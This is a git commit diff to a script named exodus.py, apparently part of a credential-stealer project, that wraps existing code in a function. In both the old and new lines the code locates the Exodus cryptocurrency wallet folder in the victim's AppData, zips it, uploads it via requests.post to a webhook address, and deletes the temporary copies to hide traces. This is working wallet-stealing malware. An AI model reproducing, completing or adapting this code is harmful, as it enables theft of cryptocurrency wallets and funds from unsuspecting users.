8a3d4c5350db1a9c7ff7ea3813a8bc7fba467faa
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2023-03-30 00:25:11 -0300

    Update exodus.py

--- scripts/exodus.py
+++ scripts/exodus.py
@@ -1,16 +1,16 @@
 import os.path, shutil, requests
 
 user = os.path.expanduser("~")
+def exo():
+ hook = ""
+ if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
+  shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
+  shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")
 
-hook = ""
-if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
- shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
- shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")
-
- file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
- r = requests.post(hook, files=file)
- try:
-  os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
-  os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
- except:
-   pass
+  file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
+  r = requests.post(hook, files=file)
+  try:
+   os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
+   os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
+  except:
+    pass
